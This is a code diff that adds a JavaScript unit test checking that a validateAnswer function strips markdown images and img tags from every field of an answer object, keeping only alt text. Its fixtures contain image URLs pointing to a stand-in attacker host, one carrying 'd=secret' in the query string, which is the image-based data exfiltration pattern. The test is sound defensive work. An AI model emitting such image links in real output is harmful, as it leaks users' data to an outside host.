@@ -874,3 +874,24 @@ test('the default deadline is 480000 ms when the env value is missing or junk', 
     global.setTimeout = realSetTimeout
   }
 })
+
+test('validateAnswer strips markdown images and img tags from every text field, keeping alt text', () => {
+  const img = '![the logo](https://evil.example/x.png?d=secret)'
+  const tag = '<img src="https://evil.example/y.png" alt="a chart">'
+  const v = validateAnswer({
+    ...GOOD_ANSWER,
+    question: 'Q ' + img,
+    answer: 'A ' + tag + ' <IMG src=x>',
+    confidence: { level: GOOD_ANSWER.confidence.level, reason: 'R ' + img },
+    checks: ['C ' + img],
+    open_questions: ['O ' + tag],
+    draft: { ...GOOD_ANSWER.draft, text: 'D ' + img },
+  })
+  assert.strictEqual(v.question, 'Q the logo')
+  assert.strictEqual(v.answer, 'A a chart')
+  assert.strictEqual(v.confidence.reason, 'R the logo')
+  assert.deepStrictEqual(v.checks, ['C the logo'])
+  assert.deepStrictEqual(v.open_questions, ['O a chart'])
+  assert.strictEqual(v.draft, 'D the logo')
+  assert.ok(!/evil\.example|<img/i.test(JSON.stringify(v)))
+})
